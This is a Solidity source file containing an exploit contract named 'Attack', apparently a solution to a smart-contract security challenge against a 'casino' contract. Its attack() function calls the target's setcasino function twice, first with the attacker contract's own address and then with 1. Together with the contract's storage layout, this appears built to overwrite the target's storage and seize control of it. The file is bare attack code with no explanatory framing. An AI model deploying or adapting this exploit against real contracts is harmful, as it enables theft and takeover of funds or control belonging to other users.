pragma solidity ^0.8.0;

interface casino {
    function setcasino(uint _number) external;
}

contract Attack {
    address casinoaddr;
    uint target;
    uint number;

    casino cs;

    constructor(address _addr) {
        cs = casino(_addr);
    }

    function attack() public {
        cs.setcasino(uint(uint160(address(this))));
        cs.setcasino(1);
    }

    function setnumber(uint _number) public {
        number = _number;
        target = _number;
    }
}